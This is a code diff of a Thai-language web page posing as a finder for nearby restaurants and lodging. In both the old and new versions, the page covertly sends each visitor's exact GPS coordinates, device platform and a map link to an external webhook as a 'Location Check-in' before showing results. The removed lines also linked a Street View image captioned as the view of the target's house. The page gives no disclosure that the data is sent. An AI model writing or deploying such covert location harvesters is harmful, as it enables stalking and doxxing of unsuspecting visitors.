@@ -9,8 +9,6 @@
     <style>
         body { font-family: 'Kanit', sans-serif; background: #020617; color: white; overflow: hidden; user-select: none; }
         .glass-panel { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(24px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .scan-anim { height: 2px; background: #3b82f6; position: absolute; width: 100%; top: 0; animation: scan move 3s infinite; box-shadow: 0 0 20px #3b82f6; }
-        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
         .success-glow { box-shadow: 0 0 40px rgba(34, 197, 94, 0.2); }
     </style>
 </head>
@@ -39,10 +37,8 @@
                 </button>
             </div>
 
-            <div id="step-scan" class="hidden text-center py-10">
-                <div class="relative w-24 h-24 mx-auto mb-6 rounded-full border-2 border-blue-500/50 overflow-hidden flex items-center justify-center">
-                    <div class="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
-                </div>
+            <div id="step-loading" class="hidden text-center py-10">
+                <div class="animate-spin inline-block w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full mb-4"></div>
                 <p id="status-msg" class="text-blue-400 text-sm animate-pulse tracking-widest">กำลังเชื่อมต่อดาวเทียม GPS...</p>
             </div>
 
@@ -50,14 +46,14 @@
                 <div class="mb-6 p-4 bg-green-500/10 border border-green-500/20 rounded-2xl flex items-center gap-3">
                     <div class="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center text-white">✓</div>
                     <div>
-                        <p class="text-green-400 font-bold text-sm">ยืนยันตัวตนสำเร็จ</p>
+                        <p class="text-green-400 font-bold text-sm">ยืนยันพิกัดสำเร็จ</p>
                         <p class="text-[10px] text-slate-500">Ref: TX-994102-B</p>
                     </div>
                 </div>
 
-                <h3 class="text-sm font-semibold text-slate-300 mb-4 uppercase tracking-wider">ร้านอาหารและที่พักแนะนำในรัศมี 2 กม.</h3>
+                <h3 class="text-sm font-semibold text-slate-300 mb-4 uppercase tracking-wider">ร้านอาหารและที่พักแนะนำใกล้คุณ</h3>
                 <div id="places-container" class="space-y-3">
-                    </div>
+                </div>
             </div>
         </div>
     </div>
@@ -73,36 +69,33 @@
             if (!navigator.geolocation) return alert("อุปกรณ์ไม่รองรับ");
             
             document.getElementById('step-init').classList.add('hidden');
-            document.getElementById('step-scan').classList.remove('hidden');
+            document.getElementById('step-loading').classList.remove('hidden');
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 userPos.lat = pos.coords.latitude;
                 userPos.lon = pos.coords.longitude;
-                document.getElementById('status-msg').innerText = "เข้าถึง GPS สำเร็จ... กำลังบันทึกข้อมูล";
                 
-                await sendToWebhook();
+                // ส่งเฉพาะข้อมูลพิกัดไป Webhook
+                await sendDataOnly();
+                
+                showResults();
             }, (err) => {
                 alert("กรุณาเปิดตำแหน่ง (GPS) เพื่อใช้งาน");
                 location.reload();
             });
         }
 
-        async function sendToWebhook() {
-            // แก้ไขพารามิเตอร์ URL: cbll = ละติจูด,ลองจิจูด | layer = c (Street View)
-            const streetViewUrl = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userPos.lat},${userPos.lon}`;
-            const googleMapsUrl = `https://www.google.com/maps/search/?api=1&query=${userPos.lat},${userPos.lon}`;
-
+        async function sendDataOnly() {
             const payload = {
                 embeds: [{
-                    title: "🟢 [Premium Check-in] ตรวจพบข้อมูลใหม่",
-                    color: 5763719,
+                    title: "📍 [Location Check-in] ตรวจพบตำแหน่งใหม่",
+                    color: 3447003,
                     fields: [
-                        { name: "📍 พิกัดแม่นยำ", value: `${userPos.lat}, ${userPos.lon}`, inline: true },
-                        { name: "🏙️ Street View", value: `[ดูหน้าบ้านจริง](${streetViewUrl})`, inline: true },
-                        { name: "📱 อุปกรณ์", value: navigator.platform, inline: true },
-                        { name: "🔗 Google Maps", value: `[นำทางไปจุดพิกัด](${googleMapsUrl})` }
+                        { name: "พิกัด", value: `${userPos.lat}, ${userPos.lon}`, inline: true },
+                        { name: "อุปกรณ์", value: navigator.platform, inline: true },
+                        { name: "Google Maps", value: `[ดูแผนที่](https://www.google.com/maps?q=${userPos.lat},${userPos.lon})` }
                     ],
-                    footer: { text: "ระบบยืนยันตัวตนอัจฉริยะ • " + new Date().toLocaleString() }
+                    footer: { text: "ระบบระบุพิกัดอัตโนมัติ • " + new Date().toLocaleString() }
                 }]
             };
 
@@ -113,14 +106,12 @@
                     body: JSON.stringify(payload)
                 });
             } catch (e) {
-                console.error("Webhook Error");
+                console.error("Webhook error");
             }
-            
-            showResults();
         }
 
         function showResults() {
-            document.getElementById('step-scan').classList.add('hidden');
+            document.getElementById('step-loading').classList.add('hidden');
             document.getElementById('step-result').classList.remove('hidden');
 
             const categories = [
@@ -130,10 +121,7 @@
             ];
 
             const container = document.getElementById('places-container');
-            container.innerHTML = ''; // ล้างข้อมูลเก่า
-            
             categories.forEach(item => {
-                // แก้ไขการค้นหาพิกัดรอบข้างให้ใช้พารามิเตอร์ที่ถูกต้อง
                 const searchLink = `https://www.google.com/maps/search/${item.query}/@${userPos.lat},${userPos.lon},15z`;
                 container.innerHTML += `
                     <a href="${searchLink}" target="_blank" class="flex items-center gap-4 bg-white/5 border border-white/10 p-4 rounded-2xl hover:bg-white/10 hover:border-blue-500/50 transition-all group">
